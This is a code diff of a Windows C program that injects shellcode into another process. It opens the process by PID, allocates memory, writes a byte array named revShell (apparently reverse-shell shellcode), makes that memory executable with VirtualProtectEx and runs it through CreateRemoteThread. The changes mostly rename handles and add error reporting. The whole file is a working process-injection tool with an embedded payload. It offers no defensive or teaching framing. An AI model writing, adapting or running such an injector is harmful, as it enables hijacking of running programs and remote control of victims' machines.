@@ -7,7 +7,9 @@ int main(int argc, char const *argv[])
 {
     char msg[MAX_STRING];
     DWORD pid;
-    HANDLE hProcess, hThread = NULL;
+    HANDLE processHandle = NULL;
+    HANDLE threadHandle = NULL;
+    DWORD lpflOldProtect;
     unsigned char revShell[] = 
 "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
 "\xff\xff\xff\x48\xbb\xe2\x78\xd1\xe7\x2e\xdc\x93\xc3\x48"
@@ -54,8 +56,6 @@ int main(int argc, char const *argv[])
     }
 
     pid = atoi(argv[1]);
-    //info((char*)"Enter the PID: ");
-    //scanf("%ld", &pid);
     MESSAGE(INFO, "Trying to open process with (%ld)\n", pid);
 
     // HANDLE OpenProcess(
@@ -64,44 +64,63 @@ int main(int argc, char const *argv[])
     //   [in] DWORD dwProcessId
     // );
     // Open handle to the process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-    if (hProcess == NULL){
-        MESSAGE(FAIL, "Impossible to get handle of the process(0x%p): Error %ld\n", hProcess, GetLastError());
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+    if (processHandle == NULL){
+        MESSAGE(FAIL, "Impossible to get handle of the process(%ld)\n", pid);
+        PRINT_ERROR(OpenProcess);
         return EXIT_FAILURE;
     }
-    MESSAGE(OKAY, "Handle got for process(0x%p)\n", hProcess);
+    MESSAGE(OKAY, "Handle got for process(%ld) in [0x%p]\n", pid, processHandle);
 
     // LPVOID VirtualAllocEx(
-    //   [in]           HANDLE hProcess,
+    //   [in]           HANDLE processHandle,
     //   [in, optional] LPVOID lpAddress,
     //   [in]           SIZE_T dwSize,
     //   [in]           DWORD  flAllocationType,
     //   [in]           DWORD  flProtect
     // );
     // Allocate bytes to process memory
-    LPVOID baseAddr = VirtualAllocEx(hProcess, NULL, revShellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    LPVOID baseAddr = VirtualAllocEx(processHandle, NULL, revShellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
     if (baseAddr == NULL){
-        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in process(0x%p): Error %ld\n", revShellSize, hProcess, GetLastError());
+        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in process(%ld)\n", revShellSize, pid);
+        PRINT_ERROR(VirtualAllocEx);
         return EXIT_FAILURE;
     }
-    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in process(0x%p)\n", revShellSize, hProcess);
+    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in process(%ld)\n", revShellSize, pid);
 
     // BOOL WriteProcessMemory(
-    //   [in]  HANDLE  hProcess,
+    //   [in]  HANDLE  processHandle,
     //   [in]  LPVOID  lpBaseAddress,
     //   [in]  LPCVOID lpBuffer,
     //   [in]  SIZE_T  nSize,
     //   [out] SIZE_T  *lpNumberOfBytesWritten
     // );
     // Write bytes(shellcode) to process allocated memory
-    if (WriteProcessMemory(hProcess, baseAddr, (LPCVOID)revShell, revShellSize, NULL) == 0){
-        MESSAGE(FAIL, "Impossible to write shellcode to process(0x%p): Error %ld\n", hProcess, GetLastError());
+    if (WriteProcessMemory(processHandle, baseAddr, (LPCVOID)revShell, revShellSize, NULL) == 0){
+        MESSAGE(FAIL, "Impossible to write shellcode to process(%ld)\n", pid);
+        PRINT_ERROR(WriteProcessMemory);
         return EXIT_FAILURE;
     }
-    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of process(0x%p)\n", revShellSize, hProcess);
+    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of process(%ld)\n", revShellSize, pid);
+
+
+    // BOOL VirtualProtectEx(
+    //   [in]  HANDLE processHandle,
+    //   [in]  LPVOID lpAddress,
+    //   [in]  SIZE_T dwSize,
+    //   [in]  DWORD  flNewProtect,
+    //   [out] PDWORD lpflOldProtect
+    // );
+    // Change the proetction of allocated memory to EXECUTE and READ
+    if (VirtualProtectEx(processHandle,baseAddr, revShellSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect) == 0){
+        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in process(%ld)\n", pid);
+        PRINT_ERROR(WriteProcessMemory);
+        return EXIT_FAILURE;
+    }
+    MESSAGE(OKAY, "Successfully changed the allocated space of process(%ld) to EXECUTE_READ\n", pid);
 
     // HANDLE CreateRemoteThread(
-    //   [in]  HANDLE                 hProcess,
+    //   [in]  HANDLE                 processHandle,
     //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
     //   [in]  SIZE_T                 dwStackSize,
     //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,
@@ -110,20 +129,20 @@ int main(int argc, char const *argv[])
     //   [out] LPDWORD                lpThreadId
     // );
     // Create thread to run the shellcode
-    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);
-    if ( hThread == NULL){
-        MESSAGE(FAIL, "Impossible to create thread in process(0x%p): Error %ld\n", hProcess, GetLastError());
+    threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);
+    if ( threadHandle == NULL){
+        MESSAGE(FAIL, "Impossible to create thread in process(0x%p): Error %ld\n", processHandle, GetLastError());
         return EXIT_FAILURE;
     }
-    MESSAGE(OKAY, "Successfully create thread(0x%p) to run the shellcode in process(0x%p)\n", hThread, hProcess);
+    MESSAGE(OKAY, "Successfully create thread(0x%p) to run the shellcode in process(0x%p)\n", threadHandle, processHandle);
 
     MESSAGE(OKAY, "Waiting for thread to finish executing...\n");
-    WaitForSingleObject(hThread, INFINITE);
+    WaitForSingleObject(threadHandle, INFINITE);
     
     MESSAGE(OKAY,"Thread finished executing, cleaning up\n");
 
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
+    CloseHandle(threadHandle);
+    CloseHandle(processHandle);
 
     return EXIT_SUCCESS;
 }
